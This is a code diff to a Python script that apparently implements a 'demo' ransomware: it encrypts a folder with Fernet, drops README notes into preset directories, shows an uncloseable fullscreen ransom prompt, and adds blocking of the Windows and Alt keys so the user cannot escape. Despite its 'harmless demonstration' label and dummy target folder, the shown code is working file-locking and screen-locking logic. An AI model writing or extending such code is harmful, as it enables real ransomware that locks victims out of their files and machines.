@@ -2,12 +2,16 @@ import os
 import tkinter as tk
 from tkinter import messagebox
 from cryptography.fernet import Fernet
+import keyboard
 
 # Folder to encrypt/decrypt
 FOLDER_PATH = "Dummy folder"
 
 # Key file location
 KEY_FILE = "encryption.key"
+
+# List of keys to block
+blocked_keys = ['left windows', 'right windows', 'alt', 'alt gr']
 
 # Define the directories for README.txt placement
 directories = [
@@ -29,6 +33,9 @@ This is ONLY a harmless demonstration.
 DEMO_KEY = "1234ABCD"
 
 def place_readme_files():
+    """
+    Places README.txt files in the preset directories.
+    """
     for folder in directories:
         try:
             filepath = os.path.join(folder, "README.txt")
@@ -104,6 +111,9 @@ def decrypt_folder(path, key):
                 print(f"Failed to decrypt {file_path}: {e}")
 
 def ransomware_prompt():
+    """
+    Executes the ransomware prompt.
+    """
     window = tk.Tk()
     window.title("Files Locked (Demo)")
     window.attributes("-fullscreen", True)
@@ -116,15 +126,12 @@ def ransomware_prompt():
     entry = tk.Entry(window, font=("Arial", 24), justify='center')
     entry.pack(pady=20)
 
-    while not os.path.exists(KEY_FILE):
-        generate_key()
-    encrypt_folder(FOLDER_PATH, load_key())
-
     def validate_key():
         if entry.get() == DEMO_KEY:
             messagebox.showinfo("Unlocked", "Correct key! Demo ended.")
             decrypt_folder(FOLDER_PATH, load_key())
             window.destroy()
+            exit(0)  # Exit the program
         else:
             messagebox.showerror("Incorrect Key", "Wrong DEMO KEY! Try again.")
 
@@ -133,8 +140,17 @@ def ransomware_prompt():
     submit_btn.pack(pady=10)
 
     window.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close
+    
     window.mainloop()
 
 if __name__ == "__main__":
     place_readme_files()
+    
+    while not os.path.exists(KEY_FILE):
+        generate_key()
+    encrypt_folder(FOLDER_PATH, load_key())
+    
+    for key in blocked_keys:
+        keyboard.block_key(key)
+
     ransomware_prompt()
